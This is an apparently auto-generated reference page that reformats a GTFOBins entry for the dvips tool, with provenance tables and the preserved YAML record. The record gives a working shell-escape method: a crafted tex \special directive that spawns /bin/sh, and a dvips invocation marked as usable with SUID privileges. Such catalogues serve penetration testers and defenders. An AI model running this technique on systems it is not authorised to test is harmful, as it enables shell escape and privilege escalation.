---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# dvips

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `dvips` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dvips` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [dvips](../../tools/linux/dvips.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | dvips |
| name | dvips |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/dvips/ |

## Preserved Source Material

````yaml
_body: ''
_name: dvips
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dvips
functions:
  shell:
  - code: dvips -R0 texput.dvi
    comment: 'The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.


      ```

      tex ''\special{psfile="`/bin/sh 1>&0"}\end''

      ```'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
````
